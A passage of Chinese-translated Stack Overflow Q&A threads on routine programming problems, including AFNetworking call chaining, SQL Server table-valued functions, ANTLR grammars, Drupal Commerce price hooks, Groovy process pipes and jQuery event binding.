TestVector<typename Type>::cross (TestVector const& other) const {
     // custom
} 
```

# asp.net - 向 ASP 站点添加新页面

> ID：13491965
> 
> 赞同：0
> 
> 时间：2012-11-21T11:09:32.190
> 
> 标签：asp.net, visual-studio

如果这是一个非常愚蠢的问题，我深表歉意。我想向现有的 ASP 站点添加一个简单的页面。作为一个完整的asp新手，因为我通常在HTML / PHP中工作，我真的很挣扎。根据我目前的研究，我需要下载 Visual Studio 对吗？有替代方案吗？我可以不只使用文本编辑器（Sublime 是我常用的）并通过 Filezilla 上传吗？

*   编辑* 我想添加，我想添加新页面的网站是限制性 CMS 的一部分，不允许我通过 WYSIWYG 添加 Javascript 联系表格

对此事的任何启示都将受到高度重视

问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T11:35:16.447

您可以使用文本编辑器并保存扩展名为 aspx 的文件并将其复制到您的项目中，或者只需在 Visual Studio 中打开您的项目并在其中添加新的 Web 表单。

# android - 如何从 Android WebView 捕获 http post 数据

> ID：13491967
> 
> 赞同：0
> 
> 时间：2012-11-21T11:09:38.053
> 
> 标签：android, android-webview

> **可能重复：**
> [是否可以访问通过 WebView 发布的 HTML 表单数据？](https://stackoverflow.com/questions/3613798/is-it-possible-to-access-html-form-data-posted-through-a-webview)

我想知道如何从我的 Android webview 中捕获 http post 值。当我提交此表单时，我从我的资产文件夹中的 web 视图中加载了一个 web 表单，我喜欢捕获帖子值。

任何想法如何完成这项工作？

谢谢

# objective-c - 如何在前一个成功完成后将多个 AFNetworking 调用链接到每个运行？

> ID：13491972
> 
> 赞同：1
> 
> 时间：2012-11-21T11:09:56.353
> 
> 标签：objective-c, asynchronous, objective-c-blocks, afnetworking

以下方法使用 AFNetworking 向 Web 服务发送请求并（成功时）对响应进行操作。AFNetworking 异步执行请求并使用块来判断成功或失败。所以发送请求的方法看起来像这样（简化）：

```
- (void)sendRequestForConnector:(NSString *)connector 
          success:(void (^)(NSData *responseXml))success
          failure:(void (^)(NSError *error))failure
{
  AFHTTPRequestOperation *operation = [self HTTPRequestOperationForConnector:connector];
  [operation setCompletionBlockWithSuccess:^(AFHTTPRequestOperation *operation, id responseObject) 
  {
    [self handleSuccessForConnector:connector response:[operation responseData]];
    success([operation responseData]);
  } 
  failure:^(AFHTTPRequestOperation *operation, NSError *error) 
  {
    [self handleFailureForConnector:connector error:error];
    failure(error);
  }

  [operation start];
} 
```

在另一个类中，此方法用于多次调用 Web 服务。上一个调用成功后，下一个调用就完成了。这个方法看起来像这样（为简洁起见省略了故障块）：

```
- (void)import 
{
   [client sendRequestForConnector:@"cities" success:^{
     [client sendRequestForConnector:@"categories" success:^{
       [client sendRequestForConnector:@"categoryTranslations" success:^{
         [client sendRequestForConnector:@"products" success:^{
           [client sendRequestForConnector:@"productTranslations" success:^{

             [self finishImport];

           }];
         }];
       }]; 
     }];
   }];
} 
```

这是可行的，但是正如我们所看到的，每个 web 服务调用都会添加另一个嵌套的成功块处理程序。在我看来，必须有更好的方法来做到这一点，但我想不出一个。

最好，我想在执行下一个调用之前等待上一个调用完成，并使用 GCD 之类的东西异步调用整个导入方法。然而，AFNetworking 并不是为进行同步调用而设计的。

任何如何实现这一目标的想法都非常受欢迎。还是我目前的解决方案是可行的？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-07-01T04:43:52.050

我处于同样的情况，我需要等待响应并需要在完成最后一次上传后调用 ws 进行上传，

做这件事有很多种方法

1）您可以使用`dispatch_group`并在完成所有操作时通知。

2）用create semaphores一一调用ws

```
dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);

dispatch_async(queue, ^{
    dispatch_semaphore_t test = dispatch_semaphore_create(0);
    for (NSUInteger i = 0; i < self.uploadDocument.count; ++i) {
       // My custom method with block which call ws 
      [self uploadMultipleImagesUsingAFNetworkingMultipartFormatWithDocumentId:[[self.uploadDocument objectAtIndex:i] valueForKey:kDocument_DocumentId] andIndex:i withCompletionBlock:^(id responseObj, NSError *error) {

            // Your Logic 

            dispatch_semaphore_signal(test);
        }];
        dispatch_semaphore_wait(test, DISPATCH_TIME_FOREVER);

    // Here comes when your all ws finish 
      dispatch_async(dispatch_get_main_queue(), ^{
              [self.tblUpload reloadData];
              [UIApplication sharedApplication].networkActivityIndicatorVisible = NO;

        });
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-20T17:49:16.180

你可以看看`octokit`。他们将 AFNetworking 与 Mantle 和 ReactiveCocoa 结合在一起 - 链式与 ReactiveCocoa 一起工作起来轻松而干净。

[https://github.com/octokit/octokit.objc](https://github.com/octokit/octokit.objc)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-24T12:51:51.463

我建议你看看这个答案[Better asynchronous control flow with Objective-C blocks](https://stackoverflow.com/questions/10915927/better-asynchronous-control-flow-with-objective-c-blocks)

建议使用一些自定义解决方案来解决此问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-07-01T04:34:10.997

我面临同样的问题，并且一直在考虑引入[PromiseKit](http://promisekit.org/abstracting-away-asynchronicity/)和[AFNetworking-PromiseKit](https://github.com/csotiriou/AFNetworking-PromiseKit)一段时间。但我最终放弃了，想出了一个简单而有点杂乱无章的解决方案，

所以我引入了一个叫“step”的属性，主要目的是为了kvo它。然后对于每个异步调用，当它完成时，它需要标记它的步骤。然后kvo 方法将整个过程移至下一步，即**kvo 方法进行流控制。**

例如，您的 sendRequestForConnector:@"cities" 将是第 1 步，@"categories" 是第 2 步，@"categoryTranslations" 是第 3 步，@"products" 是第 4 步 ...在每个成功块的末尾设置走向自己的价值。所以 kvo 会知道这一步已经完成，它需要调用下一个异步方法。

kvo 方法监督和控制整个过程。

```
switch (step.intValue) {
    case 1: //call step2; break;
    case 2: //call step3; break;
    case 3: //call step4; break;
    case 4: //call step5; break;
    ...
    case x: // finish, remove kvo on step
} 
```

到目前为止，它符合我的目的，我的代码看起来确实更干净。

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-11-21T11:26:14.697

如果你想进行同步调用，那么只需使用 NSString 的“stringWithContentsOfURL:”方法。因此，只需在循环中使用此代码循环遍历 NSURL 的 NSArray。

```
NSError* error = nil;
NSString* htmlSource = [NSString stringWithContentsOfURL:theNSURL encoding:NSUTF8StringEncoding error:&error];
if (error) {
    // handle error
}
// parse htmlSource 
```

# sql - 不使用 EXISTS 引入子查询时，选择列表中只能指定一个表达式

> ID：13491975
> 
> 赞同：1
> 
> 时间：2012-11-21T11:10:06.510
> 
> 标签：sql, sql-server, sql-server-2008, tsql

这是我的查询

```
Create FUNCTION [dbo].[CountUses](@couponid INT)
RETURNS INT
AS
   BEGIN
   RETURN
    (
    SELECT  c.Id,
     c.Name,
     c.CreateDate,
     Count(cu.id) NofUses
  FROM   Coupon as  c
     JOIN CouponUse as cu
       ON c.id = cu.couponid
 GROUP  BY c.Id,
     c.Name,
     c.CreateDate
     )
 END 
```

它给出的错误`Only one expression can be specified in the select list when the subquery is not introduced with EXISTS.`问题出在哪里？
除了主要答案，我也很感激您对优化我的查询的任何评论......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:13:45.877

如果您希望您的函数返回多个值，那么您需要查看[Table-Valued Functions](http://msdn.microsoft.com/en-us/library/ms191165%28v=sql.105%29.aspx)。

这些类型的函数返回一个表而不仅仅是一个值。您当前的函数设置为标量函数，因此它只能返回一个值。

如果你想要一个标量值 - 让我们说`count`那么你的函数将类似于：

```
Create FUNCTION [dbo].[CountUses](@couponid INT)
RETURNS INT
AS
   BEGIN
   RETURN
    (
      SELECT Count(cu.id) NofUses  --- this can only return one column
      FROM   Coupon as  c
      JOIN CouponUse as cu
        ON c.id = cu.couponid
      WHERE cu.couponid = @couponid
     )
   END 
```

如果您打算返回一个数据表，那么您的函数将类似于：

```
Create FUNCTION [dbo].[CountUses](@couponid INT)
RETURNS @new_table table
(
  id int,
  name varchar(50),
  CreateDate datetime,
  NofUsers int
)
AS
BEGIN
  INSERT INTO @new_table
  SELECT c.Id,
       c.Name,
       c.CreateDate,
       Count(cu.id) NofUses
      FROM   Coupon as  c
      JOIN CouponUse as cu
        ON c.id = cu.couponid
      WHERE cu.couponid = @couponid
      GROUP  BY c.Id,  c.Name,  c.CreateDate

   RETURN
END 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:17:02.030

这将解决问题：

```
Create FUNCTION [dbo].[CountUses](@couponid INT)
RETURNS TABLE 
AS
RETURN
(
    SELECT  c.Id,
            c.Name,
            c.CreateDate,
            Count(cu.id) NofUses
    FROM   Coupon as  c
    JOIN CouponUse as cu
         ON c.id = cu.couponid
    GROUP  BY c.Id,
              c.Name,
              c.CreateDate
) 
```

# java - Antlr 左因子语法

> ID：13491982
> 
> 赞同：1
> 
> 时间：2012-11-21T11:10:28.567
> 
> 标签：java, antlr

我是 Antlr 的新手。我正在使用 Antlr 3 为我的公司定义语法。

下面是我的语法：

```
grammar Grammar;

@header {
package com.grammar;
}

true        : 'true';
false       : 'false';
null        : 'null';
value       : true | false | null | STRING | NUMBER;
query           : (STATEMENT+) | STATEMENT?;
INSERT      : 'INSERT INTO' TABLE 'VALUES' '('ELEMENTS')'';';
STATEMENT   : INSERT;
STRING      : ('a'..'z'|'A'..'Z')+;
INTEGER     : '0'..'9'+;
ELEMENTS    : value | value ',' ELEMENTS; 
```

当我尝试使用 ANTLRWorks 生成代码时，出现以下异常：

```
error (211): Grammar.g.1:8: [fatal] rule Tokens has non-LL(*) decision due to recursive rule  invocations reacable from alts 18,24\. Resolve by left-factoring or using syntactic predicates or using backtrack=true option 
```

我查看了以下网站：

[http://www.antlr.org/wiki/display/ANTLR3/How+to+remove+global+backtracking+from+your+grammar](http://www.antlr.org/wiki/display/ANTLR3/How+to+remove+global+backtracking+from+your+grammar)

有什么建议可以做什么？我在网上找不到太多。

当我添加以下内容时：

```
 grammar Grammar;

@options {
  backtrack=true;
} 
```

我只有一个例外：

```
 error(100): Grammar.g:3:2: syntax error: antlr: NoViableAltException(55@[])
   [12:03:20] error(100): Grammar.g:3:2: syntax error: antlr: MissingTokenException (inserted [@-1,0:0='<missing ACTION>',<50>,3:1] at options {)
   [12:03:20] error(100): Grammar.g:3:2: syntax error: antlr:    org.antlr.runtime.EarlyExitException
 [12:03:20] error(150):  grammar file Grammar.g has no rules
  [12:03:20] error(100): Grammar.g:0:1: syntax error: assign.types:   MismatchedTreeNodeException(0!=3) 
```

编辑：

我增加了价值和元素。在 ANTLRWorks 中的图中使用 ELEMENTS 时，看不到该值。我只能看到：

```
',' ELEMENTS 
```

代替：

```
value | value ',' ELEMENTS 
```

这可能是令牌异常问题的原因吗？这实际上是允许的吗？解决办法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T12:15:34.520

尝试

```
query           : (STATEMENT)*; 
```

一些建议：

*   避免像这样的规则

    ```
    value | value ',' ELEMENTS 
    ```

两种选择都以相同的术语开头。将该术语“移出括号”：

```
 value (','  value ) * 
```

*   必须定义所有术语（NUMBER 未在您的语法中定义）

*   只有一个规则可以定义没有被其他规则引用的术语

# drupal - Drupal Commerce Line Items：更改价格？

> ID：13491983
> 
> 赞同：11
> 
> 时间：2012-11-21T11:10:31.437
> 
> 标签：drupal, drupal-7, drupal-commerce

我必须将一些自定义金额的订单项添加到我的购物车中。商务产品以价格 = 0 保存，我的模块计算价格并将行项目添加到购物车/订单，但我不明白如何以编程方式设置价格。

我已经阅读了有关使用规则的信息，但我需要我的模块能够设置/更改价格，**而无需调用 rules**。

我尝试过使用实体包装器，我尝试更改使用 commerce_product_line_item_new() 创建的行项目，但没有任何内容，当行项目进入购物车时始终具有原始产品价格（在我的情况下为 0）。

如何以编程方式更改订单项价格？

到目前为止，我的代码如下所示：

```
// For debugging, this function is called by hook_menu()
function mymodule_test($product_id)
{
    global $user;
    $user = user_load($user->uid);

    $order = commerce_cart_order_load($user->uid);
    $order_wrapper = entity_metadata_wrapper('commerce_order', $order);

    $product = commerce_product_load($product_id);

    $line_item = commerce_product_line_item_new(
            $product,
            1,
            0,
            array(
            ),
            'cover'
    );

    $line_item_wrapper = entity_metadata_wrapper("commerce_line_item", $line_item);

    $line_item_wrapper->commerce_unit_price->data = commerce_price_component_add(
            $line_item_wrapper->commerce_unit_price->value(),
            'base_price',
            array(
                            'amount' => 1234,
                            'currency_code' => 'EUR',
                            'data' => array(),
            ),
            TRUE
    );

    $insert_line_item = commerce_cart_product_add($user->uid, $line_item_wrapper->value(), FALSE);

    return 'done';
} 
```

奇怪的是，我尝试修改 commerce/modules/line_item/commerce_line_item.rules.inc 中的 commerce_line_item_unit_price_amount() 代码，但是这个测试：

```
<?php
    global $user;
    $product = commerce_product_load(4); // my commerce product for test

    $line_item = commerce_product_line_item_new(
        $product,
        1,
        0,
        array(
        ),
        'cover' // I do have this line_items type
    );

    // manually set amount and component name
    $amount = 1234;
    $component_name = 'base_price'; // tryed with discount, nothing change

    $wrapper = entity_metadata_wrapper('commerce_line_item', $line_item);
    $unit_price = commerce_price_wrapper_value($wrapper, 'commerce_unit_price', TRUE);

    // Calculate the updated amount and create a price array representing the
    // difference between it and the current amount.
    $current_amount = $unit_price['amount'];
    $updated_amount = commerce_round(COMMERCE_ROUND_HALF_UP, $amount);

    $difference = array(
        'amount' => $updated_amount - $current_amount, 
        'currency_code' => $unit_price['currency_code'], 
        'data' => array(),
    );

    // Set the amount of the unit price and add the difference as a component.
    $wrapper->commerce_unit_price->amount = $updated_amount;

    $wrapper->commerce_unit_price->data = commerce_price_component_add(
        $wrapper->commerce_unit_price->value(), 
        $component_name, 
        $difference, 
        TRUE
    );

    $insert_line_item = commerce_cart_product_add($user->uid, $line_item, FALSE);
?> 
```

仍然失败，line_item 以参考产品的原价进入购物车。

任何的想法？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2014-01-28T01:23:46.160

对于那些不想使用规则并希望直接改变价格的人。这是我的解决方案：

```
// Alter the price in list and single product page.
function my_module_commerce_product_calculate_sell_price_line_item_alter($line_item){

    $price = 100; //1 dollar
    $line_item->commerce_unit_price[LANGUAGE_NONE]['0']['amount'] = $price;

}

// Alter the price in cart & order.
function my_module_commerce_cart_line_item_refresh($line_item, $order_wrapper){

    $price = 100; //1 dollar
    $line_item->commerce_unit_price[LANGUAGE_NONE]['0']['amount'] = $price;
    // Alter the base_price component.
    $line_item->commerce_unit_price[LANGUAGE_NONE]['0']['data']['components']['0']['price']['amount'] = $price;

} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-02-07T03:43:35.190

如果您希望忽略已保存到订单项的任何先前值并根据您的新金额重新计算总数，那么您正在寻找的函数是 commerce_line_item_rebase_unit_price。

设置新的金额值，然后通过那里运行您的订单项，保存订单项和订单：

```
$line_item_wrapper->commerce_unit_price->amount = 13;

commerce_line_item_rebase_unit_price($line_item_wrapper->value());

commerce_line_item_save($line_item_wrapper->value()); 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-05-02T23:05:20.310

我今天整天都在努力解决这个问题，最终找到了改变订单项价格的正确途径。问题是，即使您成功地将订单项价格更改为自定义值，在下一页刷新购物车时，也会重置订单项以匹配原始产品价格。详细看一下[`commerce_cart_order_refresh()`](http://api.drupalcommerce.org/api/Drupal%20Commerce/sites%21all%21modules%21commerce%21modules%21cart%21commerce_cart.module/function/commerce_cart_order_refresh/DC)函数。每次在页面上加载订单/购物车时都会执行此功能，并且无法绕过它。

事实证明，更改行项目价格的正确方法是使用规则或实现该[`hook_commerce_cart_line_item_refresh()`](http://api.drupalcommerce.org/api/Drupal%20Commerce/sites%21all%21modules%21commerce%21modules%21cart%21commerce_cart.api.php/function/hook_commerce_cart_line_item_refresh/DC)功能。无论哪种方式，Drupal Commerce 都需要能够在每次加载购物车/订单时应用更改逻辑。

我最终在 Line Item 中创建了一个自定义字段，我在其中存储了我想要的自定义价格值。然后，每当刷新购物车时，我使用定价规则将自定义价格值复制到产品价格值。

以下博客文章对解决这个问题非常有帮助。它向您展示了如何将自定义字段添加到行项目类型以及如何设置定价规则以将自定义金额复制到单价。

[http://commerceguys.com/blog/using-custom-line-items-provide-donation-feature-drupal-commerce](http://commerceguys.com/blog/using-custom-line-items-provide-donation-feature-drupal-commerce)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-07-23T22:09:55.673

最近我不得不在 Commerce 中实现一个捐赠表格，但[Commerce Express Checkout](https://drupal.org/project/commerce_express_checkout)模块不处理自定义行项目。由于这是一笔捐赠（谁在试图搞砸房子？），我觉得将捐赠金额作为快速结帐模块提供的 URL 中的第三个参数传递是合适的。以下是我如何破解模块：

我向路由器添加了一个新条目：

```
$items['commerce-express-checkout/%/%/%'] = array(
      'title' => 'Express Checkout w/ extra argument',
      // 'page callback' => 'commerce_express_checkout_create_order',
      'page callback' => 'commerce_express_checkout_create_order_extra',
      'page arguments' => array(1, 2, 3),
      'access arguments' => array('access checkout'),
      'type' => MENU_CALLBACK,
  ); 
```

我复制并调整了默认回调并添加了“_extra”。请注意，“数据”属性似乎是此类情况下的静态变量存储，并保留了订单项的生命周期。

```
function commerce_express_checkout_create_order_extra($product_id, $token, $amount) {

  if (drupal_hmac_base64($product_id, drupal_get_private_key().drupal_get_hash_salt()) == $token && is_numeric($amount)) {
    global $user;

    $product = commerce_product_load($product_id);

    $product->commerce_price['und'][0]['amount'] = (int)$amount;

    $order = ($user->uid) ? commerce_order_new($user->uid, 'checkout_checkout') : commerce_cart_order_new();

    commerce_order_save($order);

    $price = array('amount' => commerce_round(COMMERCE_ROUND_HALF_UP, $amount), 'currency_code' => commerce_default_currency());

    $line_item = commerce_product_line_item_new($product, 1, $order->order_id);
    $line_item->data = array('und' => array('0' => $price));
    commerce_line_item_save($line_item);

    $order_wrapper = entity_metadata_wrapper('commerce_order', $order);

    $order_wrapper->commerce_line_items[] = $line_item;

    $order->data['type'] = 'commerce_express_checkout_order';

    commerce_order_save($order);

    drupal_goto('checkout/' . $order->order_id);

    return "";
  }

   return "";
} 
```

这是由于学习曲线而最终变得最棘手的部分，并且不知道要使用什么功能：

```
/**                                                                             
 * Implements hook_commerce_cart_line_item_refresh().                           
 */                                                                             
function commerce_express_checkout_commerce_cart_line_item_refresh($line_item, $order_wrapper) { 
  if ($line_item->commerce_product['und'][0]['line_item_label'] == 'DONATE' || $line_item->commerce_product['und'][0]['product_id'] == '11') {
    $price = array('amount' => commerce_round(COMMERCE_ROUND_HALF_UP, $line_item->data['und'][0]['amount']), 'currency_code' => commerce_default_currency());
    $line_item->commerce_unit_price = array('und' => array('0' => $price));
    $line_item_wrapper = entity_metadata_wrapper('commerce_line_item', $line_item);
    $line_item_wrapper->commerce_unit_price->data = commerce_price_component_add(
      $line_item_wrapper->commerce_unit_price->value(), 'base_price', $price, TRUE
    );
  }
} 
```

每次修改购物车时，它都会刷新并尝试将购物车中的产品设置为其代码内原型。这对我来说似乎也很低效，但我可能会遗漏一些东西。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-08-20T21:39:26.073

这篇文章为我指明了正确的方向，通过使用`hook_commerce_cart_line_item_refersh()`. 然而，这里的一些答案要么是完全错误的，要么是非常低效和草率的。

这将是在 Drupal Commerce 中更改行项目类型的正确工作解决方案：

```
/*  
 * implements hook_commerce_cart_line_item_refresh()
 *  
 */

function MYMODULE_commerce_cart_line_item_refresh($line_item, $order_wrapper){

    $line_wrapper = entity_metadata_wrapper('commerce_line_item', $line_item);

    $new_price = 100; //I use a function to calculate the value of $new_price

    if(!empty($new_price)){
        $line_wrapper->commerce_unit_price->amount->set($new_price);
        $line_wrapper->save();
    }
} 
```

# shell - 无法从命令 `ps -eaf | 获得正确的输出 grep groovy` 使用 groovy

> ID：13491984
> 
> 赞同：0
> 
> 时间：2012-11-21T11:10:33.873
> 
> 标签：shell, groovy, process

如果我使用外壳：

```
ps -eaf | grep groovy 
```

我可以得到这样的输出：

```
[root@test www]# ps -eaf | grep groovy
root       924   539  1 03:15 pts/0    00:00:05 /usr/java/jdk1.6.0_31/bin/java -classpath
/root/dev/groovy-1.8.8/lib/groovy-1.8.8.jar -Dscript.name=./groovysh -Dprogram.name=groovysh 
-Dgroovy.starter.conf=/root/dev/groovy-1.8.8/conf/groovy-starter.conf 
-Dgroovy.home=/root/dev/groovy-1.8.8 -Dtools.jar=/usr/java/jdk1.6.0_31/lib/tools.jar
org.codehaus.groovy.tools.GroovyStarter --main org.codehaus.groovy.tools.shell.Main 
--conf /root/dev/groovy-1.8.8/conf/groovy-starter.conf --classpath .
root      1127   562  0 03:20 pts/1    00:00:00 grep groovy
[root@test www]# 
```

但是如果我在 groovy 中运行这个命令：

```
proc = "ps -eaf | grep groovy".execute()

proc.waitFor()  // => return 1

proc.in.text  // => return ""

proc.err.text  // => see following 
```

将`proc.err.text`是`ps`命令文件：

```
ERROR: Garbage option.

********* simple selection *********  ********* selection by list *********
-A all processes                      -C by command name
-N negate selection                   -G by real group ID (supports names)
-a all w/ tty except session leaders  -U by real user ID (supports names)
-d all except session leaders         -g by session OR by effective group name
-e all processes                      -p by process ID
T  all processes on this terminal     -s processes in the sessions given 
```

但如果我运行`ps -eaf`它会是正确的。

好像`|`不能用，是真的吗？如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:16:12.043

是的，你不能像这样使用 shell 输出管道和重定向。

一种选择是：

```
Process ps = 'ps -eaf'.execute()
Process gr = 'grep groovy'.execute()

Process all = ps | gr

println all.text 
```

另一种是使用执行的List形式将其包装在一个新的shell中：

```
println( [ 'sh', '-c', 'ps -eaf | grep groovy' ].execute().text ) 
```

# android - 假电话和消息

> ID：13491987
> 
> 赞同：1
> 
> 时间：2012-11-21T11:10:41.907
> 
> 标签：android, phone-call

谁能帮我创建一个假电话。

作为同一部手机，我想创建一个假名或号码并修复时间：示例

```
5sec.(here i am using the toggle button enable disable fake call) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:17:04.310

您不能创建假电话。您可以通过在您的应用程序中重新创建拨号屏幕的外观来假装这是一个呼叫，并在您需要伪造呼叫时显示它，但您不能愚弄（也许它**可能**在有根设备上可行，但我假设您的目标常规设备）系统并让系统拨号器（或替换）认为有电话而没有电话。

# jquery-ui - Jquery draggable：使用助手'clone'和appendTo滚动droppable

> ID：13491991
> 
> 赞同：3
> 
> 时间：2012-11-21T11:10:48.170
> 
> 标签：jquery-ui, clone, jquery-ui-draggable, jquery-ui-droppable, appendto

我正在起诉 jquery ui 可拖动到可以拖放到其他项目的 .droppable 列表中的项目列表上。这是一个[jsFiddle](http://jsfiddle.net/a4M7m/)来展示我正在尝试做的事情：

```
<div id="container">
<div id="left-pane" class="pane">
    <div class="item">Item A</div>
    <div class="item">Item B</div>
    <div class="item">Item C</div>
    <div class="item">Item D</div>
</div>

<div id="right-pane" class="pane">
    <div class="item">Item E</div>
    <div class="item">Item F</div>
    <div class="item">Item G</div>
    <div class="item">Item H</div>
</div> 
```

​</p>

```
$('.item').draggable({
    helper: 'clone',
    appendTo: '#contentpane',
    cursor: 'move'
});
$('.item').droppable(); 
```

窗格具有固定的高度，`overflow-y: auto`因此我们可以在内部滚动以查看隐藏的元素。

将一个元素从一个列表拖动到另一个时，列表不会滚动，因为我使用 appendTo 并且拖动的项目不在列表中。当我拖动一个项目时，有没有办法让列表“可滚动”？否则不可能将项目放在列表底部，比如说在小提琴示例中将“项目 A”放在“项目 H”上

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T06:45:52.623

能够使用来自不同容器的滚动功能真的很不容易。

我打开了一个关于这个主题的话题。您将找到带有功能解决方法的问题的编辑。检查这个相关问题：[JqueryUI, drag elements into a scrolling dropable div contains large table](https://stackoverflow.com/questions/12670124/jqueryui-drag-elements-into-cells-of-a-scrolling-dropable-div-containing-large)

关于您的最后一句话，您可以使用 sortable 属性将您的项目放在列表的顶部。[http://jqueryui.com/sortable/](http://jqueryui.com/sortable/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-22T12:46:55.043

好吧，我发现这样做的唯一方法是检测拖动元素的位置并滚动可放置容器，并具有平滑的效果，以便它像从鼠标滚轮一样滚动。

# javascript - 我应该等待文件准备好吗？

> ID：13491995
> 
> 赞同：2
> 
> 时间：2012-11-21T11:11:03.083
> 
> 标签：javascript, jquery

在我的代码中，我将事件处理程序绑定到`document`：

```
$(document).bind("myEvent", function() { ... }); 
```

我是否必须等待准备好的事件（即使用`$(document).ready`）来绑定事件处理程序，以及当我`document`特别绑定它们时？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T11:13:45.643

`$(document).ready`用于确保 DOM 在尝试与之交互之前已准备好。如果您将脚本放入，`<head>`那么如果您与 DOM 交互，我建议您将代码放入此块中。如果您将脚本放在`<body>`DOM 元素之后的底部，则不需要它 - 但我仍然建议使用它。

**更新**

将事件处理程序附加到处理程序`document`不需要代码位于`ready`处理程序中，但它通常用于保持一致性，有些人（包括我在内）将所有脚本放置在处理程序中以附加事件`ready`处理程序（无论目标如何）。

您会注意到，在`bind()`附加处理程序之前，该元素的文档必须存在。

> 处理程序附加到 jQuery 对象中当前选定的元素，因此这些元素必须存在于调用 .bind() 的位置。

另请注意，这`.on()`是替代`.bind()`jQuery 1.7的首选和建议方法